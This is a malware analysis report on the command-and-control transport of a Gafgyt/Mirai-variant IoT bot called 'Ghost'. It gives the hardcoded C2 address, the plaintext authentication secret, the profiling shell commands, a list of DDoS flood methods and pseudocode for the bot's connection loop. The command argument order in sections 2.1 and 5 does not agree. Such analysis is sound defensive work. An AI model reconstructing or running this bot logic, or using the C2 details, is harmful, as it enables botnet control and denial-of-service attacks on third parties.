# Transport Layer Specification — Gafgyt/Mirai Variant ("Ghost")

## Binary Identity

| Field | Value |
|-------|-------|
| **File** | `notstripped` (ELF 32-bit MIPS LE) |
| **Compiler** | musl libc (statically linked) |
| **C2 Bot Name** | `ghost` (self-identifies as `ghostc2bot` in authentication) |
| **Entry Point** | `main` @ `0x0001a8f0` |

---

## 1. C2 Infrastructure Retrieval

### 1.1 Observed Behavior

The binary stores the C2 server address and port in **plaintext** within the `.rodata` section. No obfuscation, encryption, or Domain Generation Algorithm (DGA) is employed. The C2 address and port are retrieved as follows:

1. **Default C2 Address**: Hardcoded string `"94.154.43.158"` at offset `0x00031514` in the `.rodata` section.
2. **Default C2 Port**: Hardcoded integer `0x913` (decimal **2323**) in the instruction stream.
3. **Command-Line Override**:
   - `argv[1]` overrides the C2 address (if `argc >= 2`).
   - `argv[2]` overrides the C2 port (if `argc >= 3`), parsed via `atoi(argv[2])`.
4. **String Resolution Mechanism**: All string constants in the binary are referenced through a **base pointer table** at address `0x00043150`. The first 4-byte entry at this table is `0x00030000` — the base address of the string region. Any string reference `PTR_LAB_00043150 + offset` resolves to `0x00030000 + offset`.

### 1.2 Recovered C2 Address(es) & Port(s)

| Parameter | Value | Storage | Verification |
|-----------|-------|---------|-------------|
| **Default C2 Address** | `94.154.43.158` | Plaintext at `0x00031514` | **Verified Fact** |
| **Default C2 Port** | `2323` (`0x913`) | Hardcoded immediate in `main` | **Verified Fact** |
| **Override C2 Address** | `argv[1]` | Runtime argument | **Verified Fact** |
| **Override C2 Port** | `argv[2]` | Runtime argument, parsed via `atoi()` | **Verified Fact** |

### 1.3 Retrieval Logic (Pseudocode)

```
// String base pointer table at address 0x43150
// Entry[0] = 0x00030000 (string region base)

function main(argc, argv):
    // --- C2 address selection ---
    if argc < 2:
        c2_address = deref(0x43150) + 0x1514    // → 0x00030000 + 0x1514 = 0x31514 = "94.154.43.158"
    else:
        c2_address = argv[1]

    // --- C2 port selection ---
    if argc < 3:
        c2_port = 0x913                          // 2323 decimal
    else:
        c2_port = atoi(argv[2])

    // --- Seed PRNG ---
    srand(time(NULL))

    // --- Main connection loop ---
    while true:
        printf("[CONNECT] Trying %s:%d...\n", c2_address, c2_port)
        fd = connect_host(c2_address, c2_port)

        if fd < 0:
            puts("[CONNECT] Failed, retrying in 10s")
            sleep(10)
            continue

        puts("[CONNECT] Connected!")
        // ... authentication and command processing follows ...
```

### 1.4 DNS Resolution

DNS resolution is performed by the `connect_host` function via the standard POSIX `getaddrinfo()` call. There is **no custom DNS logic, domain generation, or hardcoded DNS server**. The resolution path is:

1. The port integer is converted to a string using `snprintf(buf, 16, "%d", port)`.
2. `getaddrinfo(c2_address, port_str, &hints, &result)` is called with `hints.ai_family = AF_UNSPEC` (0) and `hints.ai_socktype = SOCK_STREAM` (2).
3. The returned addrinfo linked list is iterated; the first address that successfully creates a socket and connects is used.

**Confidence**: **Verified Fact** — No DGA, no encrypted C2, no multi-stage retrieval.

---

## 2. Transport Initialization

### 2.1 Observed Behavior

The connection lifecycle follows a strict sequence:

#### Phase 1: Socket Creation and Connection (`connect_host` @ `0x00012258`)

```
function connect_host(hostname, port):
    hints = { ai_family: AF_UNSPEC, ai_socktype: SOCK_STREAM, ai_protocol: 0 }
    port_str = snprintf(buf, 16, "%d", port)     // Format: "%d" at 0x30340

    ret = getaddrinfo(hostname, port_str, &hints, &result)
    if ret != 0:
        return -1

    sockfd = -1
    for addr = result; addr != NULL; addr = addr->ai_next:
        sockfd = socket(addr->ai_family, addr->ai_socktype, addr->ai_protocol)
        if sockfd < 0:
            continue

        if connect(sockfd, addr->ai_addr, addr->ai_addrlen) == 0:
            break   // Success

        close(sockfd)
        sockfd = -1

    freeaddrinfo(result)
    return sockfd
```

#### Phase 2: Authentication Handshake

Immediately after a successful connection, the bot sends an authentication string:

```
send_all(fd, "ghostc2botsecretreuisdhfeuishfuish\r\n", 36)
```

Where `"ghostc2botsecretreuisdhfeuishfuish\r\n"` is stored at offset `0x0003157c` (36 bytes including the CRLF terminator).

#### Phase 3: System Profiling

The bot then collects system information via shell commands:

| Command | Purpose | String Offset |
|---------|---------|---------------|
| `"uname -m"` | Get CPU architecture | `0x000315a8` |
| `"cat /etc/os-release 2>/dev/null \| grep -E '^ID=' \| cut -d= -f2 \| tr -d '\"'"` | Get OS distribution ID | `0x000315b4` |
| `"busybox --help 2>/dev/null \| head -1"` | Detect BusyBox environment | `0x00031608` |

The architecture and OS ID are formatted as `"linux.%s.%s"` (offset `0x00031640`).

A bandwidth measurement is taken via `measure_bandwidth()` (which returns `0` — **stub function** at `0x00013cac`).

The bot then sends the profile line:

```
send_all(fd, formatted_string, strlen(formatted_string))
// formatted_string = "ARCH:linux.<arch>.<os_id> 0.00\r\n"
// Template at 0x0003164c: "ARCH:%s %.2f\r\n"
```

#### Phase 4: Command Reception Loop

After sending the profile, the bot enters a receive loop:

```
while (bytes_read = recv_line(fd, buffer, 8192), bytes_read > 0):
    token = strtok(buffer, " \r\n")     // Delimiter at 0x0003165c: " \r\n"
    if token == NULL:
        continue

    if token == "PING":
        send_all(fd, "PONG\r\n", 6)     // "PONG\r\n" at 0x00031668
        continue

    if token is a recognized attack command:
        target_ip = strtok(NULL, " \r\n")
        duration_str = strtok(NULL, " \r\n")
        option_str = strtok(NULL, " \r\n")
        if all three present:
            duration = atoi(duration_str)
            if duration > 3600:
                duration = 3600
            start_attack(token, target_ip, atoi(option_str), duration)

// On recv_line returning <= 0 (disconnect):
close(fd)
puts("[CONNECT] Disconnected, reconnecting in 5s")
sleep(5)
// Loop back to Phase 1
```

### 2.2 Network Parameters

| Parameter | Value | Source |
|-----------|-------|--------|
| **Protocol** | TCP (SOCK_STREAM) | `connect_host`: `hints.ai_socktype = 2` |
| **Socket Family** | AF_UNSPEC (0) — accepts both IPv4 and IPv6 | `connect_host`: `hints.ai_family = 0` |
| **Socket Options** | None set on C2 socket | Default socket from `socket()` |
| **Send Flags** | `0` (no special flags) | `send_all` calls `send(fd, buf, len, 0)` |
| **Recv Mode** | Byte-by-byte (`recv(fd, &c, 1, 0)`) until `\n` | `recv_line` function |
| **Authentication** | Plaintext: `"ghostc2botsecretreuisdhfeuishfuish\r\n"` | 36-byte string at `0x0003157c` |
| **Profile Format** | `"ARCH:%s %.2f\r\n"` | Template at `0x0003164c` |
| **Command Delimiter** | `" \r\n"` (space, CR, LF) | String at `0x0003165c` |
| **PONG Response** | `"PONG\r\n"` (6 bytes) | String at `0x00031668` |
| **Max Attack Duration** | 3600 seconds (`0xe10`) | Clamped in `main` |

### 2.3 Reconnection Strategy

| Scenario | Behavior | Code Location |
|----------|----------|---------------|
| **Initial connection failure** | Print `"[CONNECT] Failed, retrying in 10s"`, `sleep(10)`, retry | `main` after `connect_host` returns -1 |
| **Disconnect during command loop** | Print `"[CONNECT] Disconnected, reconnecting in 5s"`, `sleep(5)`, retry | `main` after `recv_line` returns <= 0 |
| **Maximum retry attempts** | **None** — infinite loop (`while true`) | `main` outer loop |
| **Backoff algorithm** | Constant delay (10s on initial failure, 5s on disconnect) | `sleep(10)` / `sleep(5)` |

### 2.4 Connection Logic (Pseudocode)

```
function connect_host(hostname, port):
    hints = zeroed_addrinfo()
    hints.ai_family   = AF_UNSPEC        // 0
    hints.ai_socktype = SOCK_STREAM      // 2

    port_str = snprintf(port_buf, 16, "%d", port)

    if getaddrinfo(hostname, port_str, &hints, &result) != 0:
        return -1

    sockfd = -1
    for addr in result:
        sockfd = socket(addr->ai_family, addr->ai_socktype, addr->ai_protocol)
        if sockfd < 0:
            continue
        if connect(sockfd, addr->ai_addr, addr->ai_addrlen) == 0:
            break
        close(sockfd)
        sockfd = -1

    freeaddrinfo(result)
    return sockfd


function send_all(fd, data, len):
    total_sent = 0
    while total_sent < len:
        n = send(fd, data + total_sent, len - total_sent, 0)
        if n < 0:
            err = errno
            if err == EINTR (4) or err == EAGAIN (11):
                usleep(1000)
                continue
            return -1
        if n == 0:
            return -1
        total_sent += n
    return 0


function recv_line(fd, buffer, max_len):
    pos = 0
    while pos + 1 < max_len:
        n = recv(fd, &ch, 1, 0)
        if n < 1:
            return -1
        buffer[pos] = ch
        pos++
        buffer[pos] = '\0'
        if ch == '\n':
            return pos
    return pos
```

### 2.5 Analysis Gaps

| Gap | Reason | Impact |
|-----|--------|--------|
| **`measure_bandwidth()` returns 0** | The function body is a stub (`return 0` at `0x00013cac`) | The bandwidth value sent in the profile is always `0.00`. This may be intentional (the field is a placeholder) or the function may be populated at runtime via code patching. |
| **No TLS/encryption on transport** | All data is sent/received in plaintext over a raw TCP socket | The C2 communication channel provides no confidentiality or integrity protection. |
| **No heartbeat/ping mechanism** | No keepalive, heartbeat, or timeout is set on the C2 socket | The bot relies solely on `recv_line()` blocking to detect disconnection. There is no application-layer keepalive. |

---

## 3. String Table Analysis

### 3.1 Observed Behavior

The binary does **not** employ an encrypted or obfuscated string table. All strings are stored as **plaintext NUL-terminated C strings** in the `.rodata` section, beginning at base address `0x00030000`.

A **string base pointer** is stored at offset `0x00043150` in the data section. This pointer contains the value `0x00030000`. String references in the code use the pattern:

```
PTR_LAB_00043150 + offset   →   0x00030000 + offset
```

**No decryption or deobfuscation routine exists.** This differs from traditional Mirai/Gafgyt variants which use a XOR-based string table with `table_init`/`table_unlock_val`/`table_lock_val` functions.

### 3.2 Decryption Routine

**Not applicable.** No encryption/obfuscation is present. The string resolution logic is:

```
function resolve_string(offset):
    base = *(uint32_t*)0x00043150     // = 0x00030000
    return (char*)(base + offset)
```

### 3.3 Recovered Strings

All strings relevant to C2 infrastructure and transport are listed below. Full offsets are relative to `0x00030000` (i.e., the actual memory address is `0x00030000 + offset`).

#### C2 Connection Strings

| Offset | String | Purpose |
|--------|--------|---------|
| `0x1514` | `94.154.43.158` | Default C2 server IP address |
| `0x1524` | `[CONNECT] Trying %s:%d...\n` | Connection attempt log message |
| `0x1540` | `[CONNECT] Failed, retrying in 10s` | Connection failure message |
| `0x1564` | `[CONNECT] Connected!` | Connection success message |
| `0x157c` | `ghostc2botsecretreuisdhfeuishfuish\r\n` | Authentication string sent to C2 on connect |
| `0x1670` | `[CONNECT] Disconnected, reconnecting in 5s` | Disconnection message |

#### System Profiling Strings

| Offset | String | Purpose |
|--------|--------|---------|
| `0x15a4` | `r` | `popen()` mode (read) |
| `0x15a8` | `uname -m` | Shell command to get CPU architecture |
| `0x15b4` | `cat /etc/os-release 2>/dev/null \| grep -E '^ID=' \| cut -d= -f2 \| tr -d '"'` | Shell command to get OS ID |
| `0x1600` | `unknown` | Fallback OS/arch value |
| `0x1608` | `busybox --help 2>/dev/null \| head -1` | Shell command to detect BusyBox |
| `0x1630` | `BusyBox` | Expected BusyBox output match |
| `0x1640` | `linux.%s.%s` | Architecture/OS format for bot identification |
| `0x164c` | `ARCH:%s %.2f\r\n` | Bot profile line format sent to C2 |

#### Command Protocol Strings

| Offset | String | Purpose |
|--------|--------|---------|
| `0x165c` | ` \r\n` | `strtok()` delimiter for command parsing |
| `0x1660` | `PING` | C2 ping command trigger |
| `0x1668` | `PONG\r\n` | C2 pong response |

#### Attack Method Strings

| Offset | String | Attack Method ID |
|--------|--------|-----------------|
| `0x0eec` | `FIVEM` | FiveM game server UDP flood |
| `0x0ef4` | `VSE` | Valve Source Engine query flood |
| `0x0ef8` | `MCPE` | Minecraft Pocket Edition flood |
| `0x0f00` | `HEX` | Hex payload UDP flood |
| `0x0f04` | `UDP` | Standard UDP flood (0x41-filled) |
| `0x0f08` | `UDP-BIG` | Large random UDP flood |
| `0x0f10` | `UDP-PLAIN` | Plain random UDP flood |
| `0x0f1c` | `UDP-BYPASS` | DNS amplification bypass flood |
| `0x0f5c` | `BANDWIDTH-UDP` | Bandwidth saturation UDP flood |
| `0x0f6c` | `PPS-UDP` | Packets-per-second UDP flood |
| `0x0f74` | `BANDWIDTH-TCP` | Bandwidth saturation TCP flood |
| `0x0f78` | `BANDWIDTH-TCP` (variant) | TCP connect + send flood |
| `0x0f88` | `PPS-TCP` | Packets-per-second TCP flood |
| `0x0f90` | `TCPBYPASS` | Raw TCP SYN flood |
| `0x0f9c` | `OVHDROP` | OVH anti-DDoS drop flood |
| `0x0fa4` | `UDPHEX` | UDP hex payload flood |
| `0x0fac` | (TCP Xmas) | TCP Xmas/ACK flood (raw socket) |
| `0x0fb0` | (UDP+TCP hybrid) | Mixed UDP/TCP flood |
| `0x0fb4` | (TCP stomp) | TCP stomp flood |
| `0x0fb8` | `HTTPGET` | HTTP GET flood |
| `0x1008` | `HTTPPOST` | HTTP POST flood |
| `0x10a0` | `BROWSER` | Browser-emulating HTTP GET flood |
| `0x11cc` | `BROWSER-2` | Browser-emulating HTTP GET (variant) |
| `0x12f0` | `BROWSER-3` | Browser-emulating HTTP POST flood |
| `0x1420` | `MCJAVA` | Minecraft Java edition handshake flood |
| `0x1428` | `ADMIN-UDP` | Multi-socket high-performance UDP flood |

#### Infrastructure Strings

| Offset | String | Purpose |
|--------|--------|---------|
| `0x0f28` | `8.8.8.8` | DNS resolver (Google) for DNS amplification |
| `0x0f30` | `1.1.1.1` | DNS resolver (Cloudflare) for DNS amplification |
| `0x0f38` | `9.9.9.9` | DNS resolver (Quad9) for DNS amplification |
| `0x0f40` | `208.67.222.222` | DNS resolver (OpenDNS) for DNS amplification |
| `0x0f50` | `64.6.64.6` | DNS resolver (Verisign) for DNS amplification |
| `0x0340` | `%d` | Format string for port-to-string conversion in `connect_host` |

### 3.4 String Table Structure Summary

- **Storage**: Plaintext NUL-terminated C strings in `.rodata` at base `0x00030000`
- **Access**: Via base pointer at `0x00043150` containing value `0x00030000`
- **Cipher**: **None** — no encryption or obfuscation
- **Initialization**: No runtime decryption needed; strings are directly accessible from load time

---

## 4. Command-Line Usage

The bot accepts two optional command-line arguments:

```
./ghost [C2_address] [C2_port]
```

| Argument | Default | Description |
|----------|---------|-------------|
| `C2_address` | `94.154.43.158` | C2 server hostname or IP address |
| `C2_port` | `2323` | C2 server TCP port |

### Examples

```
./ghost                              # Connect to 94.154.43.158:2323
./ghost 192.168.1.100                # Connect to 192.168.1.100:2323
./ghost c2.example.com 8080          # Connect to c2.example.com:8080
```

---

## 5. Execution Flow Summary

```
main(argv):
    signal(SIGPIPE, SIG_IGN)
    c2_addr = argv[1] ?? "94.154.43.158"
    c2_port = atoi(argv[2]) ?? 2323
    srand(time(NULL))

    LOOP:
        fd = connect_host(c2_addr, c2_port)
        if fd < 0: sleep(10); continue

        send_all(fd, "ghostc2botsecretreuisdhfeuishfuish\r\n", 36)
        arch = popen("uname -m")
        os_id = popen("cat /etc/os-release ...")
        if os_id == "unknown" or empty: check BusyBox
        profile = sprintf("ARCH:%s %.2f\r\n", "linux."+arch+"."+os_id, 0.00)
        send_all(fd, profile, len(profile))

        LOOP2:
            n = recv_line(fd, buf, 8192)
            if n <= 0: break
            token = strtok(buf, " \r\n")
            if token == "PING": send_all(fd, "PONG\r\n", 6)
            elif token is attack:
                target = strtok(NULL, " \r\n")
                port_str = strtok(NULL, " \r\n")
                duration_str = strtok(NULL, " \r\n")
                if all present:
                    duration = min(atoi(duration_str), 3600)
                    start_attack(token, target, atoi(port_str), duration)

        close(fd)
        sleep(5)
        goto LOOP
```
